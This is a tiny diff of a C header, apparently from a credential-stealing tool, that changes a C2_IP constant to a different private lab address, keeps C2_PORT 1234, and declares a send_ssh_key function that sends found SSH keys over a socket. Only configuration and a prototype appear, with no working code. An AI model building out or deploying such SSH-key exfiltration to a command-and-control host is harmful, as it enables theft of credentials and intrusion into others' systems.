@@ -5,7 +5,7 @@
 
 #include "find_ssh_key.h"
 
-#define C2_IP "192.168.1.15"
+#define C2_IP "192.168.56.1"
 #define C2_PORT 1234
 
 BOOL send_ssh_key(sshKey [MAX_KEY_FILES], DWORD32, SOCKET *);
